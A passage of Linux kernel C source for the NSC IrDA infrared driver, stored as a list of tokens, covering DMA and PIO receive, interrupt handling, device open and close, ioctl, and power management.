";", "/", "*", "Enable", "DMA", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "inb", "(", "iobase", "+", "MCR", ")", "|", "MCR_DMA_EN", ",", "iobase", "+", "MCR", ")", ";", "/", "*", "Restore", "bank", "register", "*", "/", "outb", "(", "bsr", ",", "iobase", "+", "BSR", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "nsc_ircc_dma_receive_complete", "(", "self", ")", "*", "*", "Finished", "with", "receiving", "frames", "*", "*", "*", "/", "static", "int", "nsc_ircc_dma_receive_complete", "(", "struct", "nsc_ircc_cb", "*", "self", ",", "int", "iobase", ")", "{", "struct", "st_fifo", "*", "st_fifo", ";", "struct", "sk_buff", "*", "skb", ";", "__u8", "status", ";", "__u8", "bank", ";", "int", "len", ";", "st_fifo", "=", "&", "self", "-", ">", "st_fifo", ";", "/", "*", "Save", "current", "bank", "*", "/", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Read", "all", "entries", "in", "status", "FIFO", "*", "/", "switch_bank", "(", "iobase", ",", "BANK5", ")", ";", "while", "(", "(", "status", "=", "inb", "(", "iobase", "+", "FRM_ST", ")", ")", "&", "FRM_ST_VLD", ")", "{", "/", "*", "We", "must", "empty", "the", "status", "FIFO", "no", "matter", "what", "*", "/", "len", "=", "inb", "(", "iobase", "+", "RFLFL", ")", "|", "(", "(", "inb", "(", "iobase", "+", "RFLFH", ")", "&", "0x1f", ")", "<", "<", "8", ")", ";", "if", "(", "st_fifo", "-", ">", "tail", ">", "=", "MAX_RX_WINDOW", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "window", "is", "full", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "continue", ";", "}", "st_fifo", "-", ">", "entries", "[", "st_fifo", "-", ">", "tail", "]", ".", "status", "=", "status", ";", "st_fifo", "-", ">", "entries", "[", "st_fifo", "-", ">", "tail", "]", ".", "len", "=", "len", ";", "st_fifo", "-", ">", "pending_bytes", "+", "=", "len", ";", "st_fifo", "-", ">", "tail", "+", "+;", "st_fifo", "-", ">", "len", "+", "+;", "}", "/", "*", "Try", "to", "process", "all", "entries", "in", "status", "FIFO", "*", "/", "while", "(", "st_fifo", "-", ">", "len", ">", "0", ")", "{", "/", "*", "Get", "first", "entry", "*", "/", "status", "=", "st_fifo", "-", ">", "entries", "[", "st_fifo", "-", ">", "head", "]", ".", "status", ";", "len", "=", "st_fifo", "-", ">", "entries", "[", "st_fifo", "-", ">", "head", "]", ".", "len", ";", "st_fifo", "-", ">", "pending_bytes", "-", "=", "len", ";", "st_fifo", "-", ">", "head", "+", "+;", "st_fifo", "-", ">", "len", "-", "-;", "/", "*", "Check", "for", "errors", "*", "/", "if", "(", "status", "&", "FRM_ST_ERR_MSK", ")", "{", "if", "(", "status", "&", "FRM_ST_LOST_FR", ")", "{", "/", "*", "Add", "number", "of", "lost", "frames", "to", "stats", "*", "/", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_errors", "+", "=", "len", ";", "}", "else", "{", "/", "*", "Skip", "frame", "*", "/", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_errors", "+", "+;", "self", "-", ">", "rx_buff", ".", "data", "+", "=", "len", ";", "if", "(", "status", "&", "FRM_ST_MAX_LEN", ")", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_length_errors", "+", "+;", "if", "(", "status", "&", "FRM_ST_PHY_ERR", ")", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_frame_errors", "+", "+;", "if", "(", "status", "&", "FRM_ST_BAD_CRC", ")", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_crc_errors", "+", "+;", "}", "/", "*", "The", "errors", "below", "can", "be", "reported", "in", "both", "cases", "*", "/", "if", "(", "status", "&", "FRM_ST_OVR1", ")", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_fifo_errors", "+", "+;", "if", "(", "status", "&", "FRM_ST_OVR2", ")", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_fifo_errors", "+", "+;", "}", "else", "{", "/", "*", "*", "First", "we", "must", "make", "sure", "that", "the", "frame", "we", "*", "want", "to", "deliver", "is", "all", "in", "main", "memory", ".", "If", "we", "*", "cannot", "tell", ",", "then", "we", "check", "if", "the", "Rx", "FIFO", "is", "*", "empty", ".", "If", "not", "then", "we", "will", "have", "to", "take", "a", "nap", "*", "and", "try", "again", "later", ".", "*", "/", "if", "(", "st_fifo", "-", ">", "pending_bytes", "<", "self", "-", ">", "io", ".", "fifo_size", ")", "{", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "if", "(", "inb", "(", "iobase", "+", "LSR", ")", "&", "LSR_RXDA", ")", "{", "/", "*", "Put", "this", "entry", "back", "in", "fifo", "*", "/", "st_fifo", "-", ">", "head", "-", "-;", "st_fifo", "-", ">", "len", "+", "+;", "st_fifo", "-", ">", "pending_bytes", "+", "=", "len", ";", "st_fifo", "-", ">", "entries", "[", "st_fifo", "-", ">", "head", "]", ".", "status", "=", "status", ";", "st_fifo", "-", ">", "entries", "[", "st_fifo", "-", ">", "head", "]", ".", "len", "=", "len", ";", "/", "*", "*", "DMA", "not", "finished", "yet", ",", "so", "try", "again", "*", "later", ",", "set", "timer", "value", ",", "resolution", "*", "125", "us", "*", "/", "switch_bank", "(", "iobase", ",", "BANK4", ")", ";", "outb", "(", "0x02", ",", "iobase", "+", "TMRL", ")", ";", "/", "*", "x", "125", "us", "*", "/", "outb", "(", "0x00", ",", "iobase", "+", "TMRH", ")", ";", "/", "*", "Start", "timer", "*", "/", "outb", "(", "IRCR1_TMR_EN", ",", "iobase", "+", "IRCR1", ")", ";", "/", "*", "Restore", "bank", "register", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "return", "FALSE", ";", "/", "*", "I", "'", "ll", "be", "back", "!", "*", "/", "}", "}", "/", "*", "*", "Remember", "the", "time", "we", "received", "this", "frame", ",", "so", "we", "can", "*", "reduce", "the", "min", "turn", "time", "a", "bit", "since", "we", "will", "know", "*", "how", "much", "time", "we", "have", "used", "for", "protocol", "processing", "*", "/", "self", "-", ">", "stamp", "=", "ktime_get", "(", ");", "skb", "=", "dev_alloc_skb", "(", "len", "+", "1", ")", ";", "if", "(", "skb", "=", "=", "NULL", ")", "{", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_dropped", "+", "+;", "/", "*", "Restore", "bank", "register", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "return", "FALSE", ";", "}", "/", "*", "Make", "sure", "IP", "header", "gets", "aligned", "*", "/", "skb_reserve", "(", "skb", ",", "1", ")", ";", "/", "*", "Copy", "frame", "without", "CRC", "*", "/", "if", "(", "self", "-", ">", "io", ".", "speed", "<", "4000000", ")", "{", "skb_put", "(", "skb", ",", "len", "-", "2", ")", ";", "skb_copy_to_linear_data", "(", "skb", ",", "self", "-", ">", "rx_buff", ".", "data", ",", "len", "-", "2", ")", ";", "}", "else", "{", "skb_put", "(", "skb", ",", "len", "-", "4", ")", ";", "skb_copy_to_linear_data", "(", "skb", ",", "self", "-", ">", "rx_buff", ".", "data", ",", "len", "-", "4", ")", ";", "}", "/", "*", "Move", "to", "next", "frame", "*", "/", "self", "-", ">", "rx_buff", ".", "data", "+", "=", "len", ";", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_bytes", "+", "=", "len", ";", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_packets", "+", "+;", "skb", "-", ">", "dev", "=", "self", "-", ">", "netdev", ";", "skb_reset_mac_header", "(", "skb", ")", ";", "skb", "-", ">", "protocol", "=", "htons", "(", "ETH_P_IRDA", ")", ";", "netif_rx", "(", "skb", ")", ";", "}", "}", "/", "*", "Restore", "bank", "register", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "return", "TRUE", ";", "}", "/", "*", "*", "Function", "nsc_ircc_pio_receive", "(", "self", ")", "*", "*", "Receive", "all", "data", "in", "receiver", "FIFO", "*", "*", "/", "static", "void", "nsc_ircc_pio_receive", "(", "struct", "nsc_ircc_cb", "*", "self", ")", "{", "__u8", "byte", ";", "int", "iobase", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "/", "*", "Receive", "all", "characters", "in", "Rx", "FIFO", "*", "/", "do", "{", "byte", "=", "inb", "(", "iobase", "+", "RXD", ")", ";", "async_unwrap_char", "(", "self", "-", ">", "netdev", ",", "&", "self", "-", ">", "netdev", "-", ">", "stats", ",", "&", "self", "-", ">", "rx_buff", ",", "byte", ")", ";", "}", "while", "(", "inb", "(", "iobase", "+", "LSR", ")", "&", "LSR_RXDA", ")", ";", "/", "*", "Data", "available", "*", "/", "}", "/", "*", "*", "Function", "nsc_ircc_sir_interrupt", "(", "self", ",", "eir", ")", "*", "*", "Handle", "SIR", "interrupt", "*", "*", "/", "static", "void", "nsc_ircc_sir_interrupt", "(", "struct", "nsc_ircc_cb", "*", "self", ",", "int", "eir", ")", "{", "int", "actual", ";", "/", "*", "Check", "if", "transmit", "FIFO", "is", "low", "on", "data", "*", "/", "if", "(", "eir", "&", "EIR_TXLDL_EV", ")", "{", "/", "*", "Write", "data", "left", "in", "transmit", "buffer", "*", "/", "actual", "=", "nsc_ircc_pio_write", "(", "self", "-", ">", "io", ".", "fir_base", ",", "self", "-", ">", "tx_buff", ".", "data", ",", "self", "-", ">", "tx_buff", ".", "len", ",", "self", "-", ">", "io", ".", "fifo_size", ")", ";", "self", "-", ">", "tx_buff", ".", "data", "+", "=", "actual", ";", "self", "-", ">", "tx_buff", ".", "len", "-", "=", "actual", ";", "self", "-", ">", "io", ".", "direction", "=", "IO_XMIT", ";", "/", "*", "Check", "if", "finished", "*", "/", "if", "(", "self", "-", ">", "tx_buff", ".", "len", ">", "0", ")", "self", "-", ">", "ier", "=", "IER_TXLDL_IE", ";", "else", "{", "self", "-", ">", "netdev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "self", "-", ">", "ier", "=", "IER_TXEMP_IE", ";", "}", "}", "/", "*", "Check", "if", "transmission", "has", "completed", "*", "/", "if", "(", "eir", "&", "EIR_TXEMP_EV", ")", "{", "/", "*", "Turn", "around", "and", "get", "ready", "to", "receive", "some", "data", "*", "/", "self", "-", ">", "io", ".", "direction", "=", "IO_RECV", ";", "self", "-", ">", "ier", "=", "IER_RXHDL_IE", ";", "/", "*", "Check", "if", "we", "need", "to", "change", "the", "speed", "?", "*", "Need", "to", "be", "after", "self", "-", ">", "io", ".", "direction", "to", "avoid", "race", "with", "*", "nsc_ircc_hard_xmit_sir", "(", ")", "-", "Jean", "II", "*", "/", "if", "(", "self", "-", ">", "new_speed", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "Changing", "speed", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "self", "-", ">", "ier", "=", "nsc_ircc_change_speed", "(", "self", ",", "self", "-", ">", "new_speed", ")", ";", "self", "-", ">", "new_speed", "=", "0", ";", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "/", "*", "Check", "if", "we", "are", "going", "to", "FIR", "*", "/", "if", "(", "self", "-", ">", "io", ".", "speed", ">", "115200", ")", "{", "/", "*", "No", "need", "to", "do", "anymore", "SIR", "stuff", "*", "/", "return", ";", "}", "}", "}", "/", "*", "Rx", "FIFO", "threshold", "or", "timeout", "*", "/", "if", "(", "eir", "&", "EIR_RXHDL_EV", ")", "{", "nsc_ircc_pio_receive", "(", "self", ")", ";", "/", "*", "Keep", "receiving", "*", "/", "self", "-", ">", "ier", "=", "IER_RXHDL_IE", ";", "}", "}", "/", "*", "*", "Function", "nsc_ircc_fir_interrupt", "(", "self", ",", "eir", ")", "*", "*", "Handle", "MIR", "/", "FIR", "interrupt", "*", "*", "/", "static", "void", "nsc_ircc_fir_interrupt", "(", "struct", "nsc_ircc_cb", "*", "self", ",", "int", "iobase", ",", "int", "eir", ")", "{", "__u8", "bank", ";", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Status", "FIFO", "event", "*", "/", "if", "(", "eir", "&", "EIR_SFIF_EV", ")", "{", "/", "*", "Check", "if", "DMA", "has", "finished", "*", "/", "if", "(", "nsc_ircc_dma_receive_complete", "(", "self", ",", "iobase", ")", ")", "{", "/", "*", "Wait", "for", "next", "status", "FIFO", "interrupt", "*", "/", "self", "-", ">", "ier", "=", "IER_SFIF_IE", ";", "}", "else", "{", "self", "-", ">", "ier", "=", "IER_SFIF_IE", "|", "IER_TMR_IE", ";", "}", "}", "else", "if", "(", "eir", "&", "EIR_TMR_EV", ")", "{", "/", "*", "Timer", "finished", "*", "/", "/", "*", "Disable", "timer", "*", "/", "switch_bank", "(", "iobase", ",", "BANK4", ")", ";", "outb", "(", "0", ",", "iobase", "+", "IRCR1", ")", ";", "/", "*", "Clear", "timer", "event", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "ASCR_CTE", ",", "iobase", "+", "ASCR", ")", ";", "/", "*", "Check", "if", "this", "is", "a", "Tx", "timer", "interrupt", "*", "/", "if", "(", "self", "-", ">", "io", ".", "direction", "=", "=", "IO_XMIT", ")", "{", "nsc_ircc_dma_xmit", "(", "self", ",", "iobase", ")", ";", "/", "*", "Interrupt", "on", "DMA", "*", "/", "self", "-", ">", "ier", "=", "IER_DMA_IE", ";", "}", "else", "{", "/", "*", "Check", "(", "again", ")", "if", "DMA", "has", "finished", "*", "/", "if", "(", "nsc_ircc_dma_receive_complete", "(", "self", ",", "iobase", ")", ")", "{", "self", "-", ">", "ier", "=", "IER_SFIF_IE", ";", "}", "else", "{", "self", "-", ">", "ier", "=", "IER_SFIF_IE", "|", "IER_TMR_IE", ";", "}", "}", "}", "else", "if", "(", "eir", "&", "EIR_DMA_EV", ")", "{", "/", "*", "Finished", "with", "all", "transmissions", "?", "*", "/", "if", "(", "nsc_ircc_dma_xmit_complete", "(", "self", ")", ")", "{", "if", "(", "self", "-", ">", "new_speed", "!", "=", "0", ")", "{", "/", "*", "As", "we", "stop", "the", "Tx", "queue", ",", "the", "speed", "change", "*", "need", "to", "be", "done", "when", "the", "Tx", "fifo", "is", "*", "empty", ".", "Ask", "for", "a", "Tx", "done", "interrupt", "*", "/", "self", "-", ">", "ier", "=", "IER_TXEMP_IE", ";", "}", "else", "{", "/", "*", "Check", "if", "there", "are", "more", "frames", "to", "be", "*", "transmitted", "*", "/", "if", "(", "irda_device_txqueue_empty", "(", "self", "-", ">", "netdev", ")", ")", "{", "/", "*", "Prepare", "for", "receive", "*", "/", "nsc_ircc_dma_receive", "(", "self", ")", ";", "self", "-", ">", "ier", "=", "IER_SFIF_IE", ";", "}", "else", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "potential", "Tx", "queue", "lockup", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "}", "}", "else", "{", "/", "*", "Not", "finished", "yet", ",", "so", "interrupt", "on", "DMA", "again", "*", "/", "self", "-", ">", "ier", "=", "IER_DMA_IE", ";", "}", "}", "else", "if", "(", "eir", "&", "EIR_TXEMP_EV", ")", "{", "/", "*", "The", "Tx", "FIFO", "has", "totally", "drained", "out", ",", "so", "now", "we", "can", "change", "*", "the", "speed", ".", "..", "-", "Jean", "II", "*", "/", "self", "-", ">", "ier", "=", "nsc_ircc_change_speed", "(", "self", ",", "self", "-", ">", "new_speed", ")", ";", "self", "-", ">", "new_speed", "=", "0", ";", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "/", "*", "Note", ":", "nsc_ircc_change_speed", "(", ")", "restarted", "Rx", "fifo", "*", "/", "}", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "}", "/", "*", "*", "Function", "nsc_ircc_interrupt", "(", "irq", ",", "dev_id", ",", "regs", ")", "*", "*", "An", "interrupt", "from", "the", "chip", "has", "arrived", ".", "Time", "to", "do", "some", "work", "*", "*", "/", "static", "irqreturn_t", "nsc_ircc_interrupt", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "net_device", "*", "dev", "=", "dev_id", ";", "struct", "nsc_ircc_cb", "*", "self", ";", "__u8", "bsr", ",", "eir", ";", "int", "iobase", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "spin_lock", "(", "&", "self", "-", ">", "lock", ")", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "bsr", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Save", "current", "bank", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "self", "-", ">", "ier", "=", "inb", "(", "iobase", "+", "IER", ")", ";", "eir", "=", "inb", "(", "iobase", "+", "EIR", ")", "&", "self", "-", ">", "ier", ";", "/", "*", "Mask", "out", "the", "interesting", "ones", "*", "/", "outb", "(", "0", ",", "iobase", "+", "IER", ")", ";", "/", "*", "Disable", "interrupts", "*", "/", "if", "(", "eir", ")", "{", "/", "*", "Dispatch", "interrupt", "handler", "for", "the", "current", "speed", "*", "/", "if", "(", "self", "-", ">", "io", ".", "speed", ">", "115200", ")", "nsc_ircc_fir_interrupt", "(", "self", ",", "iobase", ",", "eir", ")", ";", "else", "nsc_ircc_sir_interrupt", "(", "self", ",", "eir", ")", ";", "}", "outb", "(", "self", "-", ">", "ier", ",", "iobase", "+", "IER", ")", ";", "/", "*", "Restore", "interrupts", "*", "/", "outb", "(", "bsr", ",", "iobase", "+", "BSR", ")", ";", "/", "*", "Restore", "bank", "register", "*", "/", "spin_unlock", "(", "&", "self", "-", ">", "lock", ")", ";", "return", "IRQ_RETVAL", "(", "eir", ")", ";", "}", "/", "*", "*", "Function", "nsc_ircc_is_receiving", "(", "self", ")", "*", "*", "Return", "TRUE", "is", "we", "are", "currently", "receiving", "a", "frame", "*", "*", "/", "static", "int", "nsc_ircc_is_receiving", "(", "struct", "nsc_ircc_cb", "*", "self", ")", "{", "unsigned", "long", "flags", ";", "int", "status", "=", "FALSE", ";", "int", "iobase", ";", "__u8", "bank", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "FALSE", ";", ");", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "self", "-", ">", "io", ".", "speed", ">", "115200", ")", "{", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "/", "*", "Check", "if", "rx", "FIFO", "is", "not", "empty", "*", "/", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "if", "(", "(", "inb", "(", "iobase", "+", "RXFLV", ")", "&", "0x3f", ")", "!", "=", "0", ")", "{", "/", "*", "We", "are", "receiving", "something", "*", "/", "status", "=", "TRUE", ";", "}", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "}", "else", "status", "=", "(", "self", "-", ">", "rx_buff", ".", "state", "!", "=", "OUTSIDE_FRAME", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "return", "status", ";", "}", "/", "*", "*", "Function", "nsc_ircc_net_open", "(", "dev", ")", "*", "*", "Start", "the", "device", "*", "*", "/", "static", "int", "nsc_ircc_net_open", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "nsc_ircc_cb", "*", "self", ";", "int", "iobase", ";", "char", "hwname", "[", "32", "]", ";", "__u8", "bank", ";", "IRDA_ASSERT", "(", "dev", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "self", "=", "netdev_priv", "(", "dev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "0", ";", ");", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "if", "(", "request_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "nsc_ircc_interrupt", ",", "0", ",", "dev", "-", ">", "name", ",", "dev", ")", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", ",", "unable", "to", "allocate", "irq", "=", "%", "d", "\\", "n", "\"", ",", "driver_name", ",", "self", "-", ">", "io", ".", "irq", ")", ";", "return", "-", "EAGAIN", ";", "}", "/", "*", "*", "Always", "allocate", "the", "DMA", "channel", "after", "the", "IRQ", ",", "and", "clean", "up", "on", "*", "failure", ".", "*", "/", "if", "(", "request_dma", "(", "self", "-", ">", "io", ".", "dma", ",", "dev", "-", ">", "name", ")", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", ",", "unable", "to", "allocate", "dma", "=", "%", "d", "\\", "n", "\"", ",", "driver_name", ",", "self", "-", ">", "io", ".", "dma", ")", ";", "free_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "dev", ")", ";", "return", "-", "EAGAIN", ";", "}", "/", "*", "Save", "current", "bank", "*", "/", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "turn", "on", "interrupts", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "IER_LS_IE", "|", "IER_RXHDL_IE", ",", "iobase", "+", "IER", ")", ";", "/", "*", "Restore", "bank", "register", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "/", "*", "Ready", "to", "play", "!", "*", "/", "netif_start_queue", "(", "dev", ")", ";", "/", "*", "Give", "self", "a", "hardware", "name", "*", "/", "sprintf", "(", "hwname", ",", "\"", "NSC", "-", "FIR", "@", "0x", "%", "03x", "\"", ",", "self", "-", ">", "io", ".", "fir_base", ")", ";", "/", "*", "*", "Open", "new", "IrLAP", "layer", "instance", ",", "now", "that", "everything", "should", "be", "*", "initialized", "properly", "*", "/", "self", "-", ">", "irlap", "=", "irlap_open", "(", "dev", ",", "&", "self", "-", ">", "qos", ",", "hwname", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "nsc_ircc_net_close", "(", "dev", ")", "*", "*", "Stop", "the", "device", "*", "*", "/", "static", "int", "nsc_ircc_net_close", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "nsc_ircc_cb", "*", "self", ";", "int", "iobase", ";", "__u8", "bank", ";", "IRDA_ASSERT", "(", "dev", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "self", "=", "netdev_priv", "(", "dev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "0", ";", ");", "/", "*", "Stop", "device", "*", "/", "netif_stop_queue", "(", "dev", ")", ";", "/", "*", "Stop", "and", "remove", "instance", "of", "IrLAP", "*", "/", "if", "(", "self", "-", ">", "irlap", ")", "irlap_close", "(", "self", "-", ">", "irlap", ")", ";", "self", "-", ">", "irlap", "=", "NULL", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "disable_dma", "(", "self", "-", ">", "io", ".", "dma", ")", ";", "/", "*", "Save", "current", "bank", "*", "/", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Disable", "interrupts", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "0", ",", "iobase", "+", "IER", ")", ";", "free_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "dev", ")", ";", "free_dma", "(", "self", "-", ">", "io", ".", "dma", ")", ";", "/", "*", "Restore", "bank", "register", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "nsc_ircc_net_ioctl", "(", "dev", ",", "rq", ",", "cmd", ")", "*", "*", "Process", "IOCTL", "commands", "for", "this", "device", "*", "*", "/", "static", "int", "nsc_ircc_net_ioctl", "(", "struct", "net_device", "*", "dev", ",", "struct", "ifreq", "*", "rq", ",", "int", "cmd", ")", "{", "struct", "if_irda_req", "*", "irq", "=", "(", "struct", "if_irda_req", "*", ")", "rq", ";", "struct", "nsc_ircc_cb", "*", "self", ";", "unsigned", "long", "flags", ";", "int", "ret", "=", "0", ";", "IRDA_ASSERT", "(", "dev", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "self", "=", "netdev_priv", "(", "dev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", ",", "(", "cmd", "=", "0x", "%", "X", ")", "\\", "n", "\"", ",", "__func__", ",", "dev", "-", ">", "name", ",", "cmd", ")", ";", "switch", "(", "cmd", ")", "{", "case", "SIOCSBANDWIDTH", ":", "/", "*", "Set", "bandwidth", "*", "/", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "{", "ret", "=", "-", "EPERM", ";", "break", ";", "}", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "nsc_ircc_change_speed", "(", "self", ",", "irq", "-", ">", "ifr_baudrate", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "break", ";", "case", "SIOCSMEDIABUSY", ":", "/", "*", "Set", "media", "busy", "*", "/", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "{", "ret", "=", "-", "EPERM", ";", "break", ";", "}", "irda_device_set_media_busy", "(", "self", "-", ">", "netdev", ",", "TRUE", ")", ";", "break", ";", "case", "SIOCGRECEIVING", ":", "/", "*", "Check", "if", "we", "are", "receiving", "right", "now", "*", "/", "/", "*", "This", "is", "already", "protected", "*", "/", "irq", "-", ">", "ifr_receiving", "=", "nsc_ircc_is_receiving", "(", "self", ")", ";", "break", ";", "default", ":", "ret", "=", "-", "EOPNOTSUPP", ";", "}", "return", "ret", ";", "}", "static", "int", "nsc_ircc_suspend", "(", "struct", "platform_device", "*", "dev", ",", "pm_message_t", "state", ")", "{", "struct", "nsc_ircc_cb", "*", "self", "=", "platform_get_drvdata", "(", "dev", ")", ";", "int", "bank", ";", "unsigned", "long", "flags", ";", "int", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "if", "(", "self", "-", ">", "io", ".", "suspended", ")", "return", "0", ";", "pr_debug", "(", "\"%", "s", ",", "Suspending", "\\", "n", "\"", ",", "driver_name", ")", ";", "rtnl_lock", "(", ");", "if", "(", "netif_running", "(", "self", "-", ">", "netdev", ")", ")", "{", "netif_device_detach", "(", "self", "-", ">", "netdev", ")", ";", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Save", "current", "bank", "*", "/", "bank", "=", "inb", "(", "iobase", "+", "BSR", ")", ";", "/", "*", "Disable", "interrupts", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "0", ",", "iobase", "+", "IER", ")", ";", "/", "*", "Restore", "bank", "register", "*", "/", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "free_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "self", "-", ">", "netdev", ")", ";", "disable_dma", "(", "self", "-", ">", "io", ".", "dma", ")", ";", "}", "self", "-", ">", "io", ".", "suspended", "=", "1", ";", "rtnl_unlock", "(", ");", "return", "0", ";", "}", "static", "int", "nsc_ircc_resume", "(", "struct", "platform_device", "*", "dev", ")", "{", "struct", "nsc_ircc_cb", "*", "self", "=", "platform_get_drvdata", "(", "dev", ")", ";", "unsigned", "long", "flags", ";", "if", "(", "!", "self", "-", ">", "io", ".", "suspended", ")", "return", "0", ";", "pr_debug", "(", "\"%", "s", ",", "Waking", "up", "\\", "n", "\"", ",", "driver_name", ")", ";", "rtnl_lock", "(", ");", "nsc_ircc_setup", "(", "&", "self", "-", ">", "io", ")", ";", "nsc_ircc_init_dongle_interface", "(", "self", "-", ">", "io", ".", "fir_base", ",", "self", "-", ">", "io", ".", "dongle_id", ")", ";", "if", "(", "netif_running", "(", "self", "-", ">", "netdev", ")", ")", "{", "if", "(", "request_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "nsc_ircc_interrupt", ",", "0", ",", "self", "-", ">", "netdev", "-", ">", "name", ",", "self", "-", ">", "netdev", ")", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", ",", "unable", "to", "allocate", "irq", "=", "%", "d", "\\", "n", "\"", ",", "driver_name", ",", "self", "-", ">", "io", ".", "irq", ")", ";", "/", "*", "*", "Don", "'", "t", "fail", "resume", "process", ",", "just", "kill", "this", "*", "network", "interface", "*", "/", "unregister_netdevice", "(", "self", "-", ">", "netdev", ")", ";", "}", "else", "{", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "nsc_ircc_change_speed", "(", "self", ",", "self", "-", ">", "io", ".", "speed", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "netif_device_attach", "(", "self", "-", ">", "netdev", ")", ";", "}", "}", "else", "{", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "nsc_ircc_change_speed", "(", "self", ",", "9600", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "}", "self", "-", ">", "io", ".", "suspended", "=", "0", ";", "rtnl_unlock", "(", ");", "return", "0", ";", "}", "MODULE_AUTHOR", "(", "\"", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "NSC", "IrDA", "Device", "Driver", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "module_param", "(", "qos_mtt_bits", ",", "int", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "qos_mtt_bits", ",", "\"", "Minimum", "Turn", "Time", "\"", ");", "module_param_hw_array", "(", "io", ",", "int", 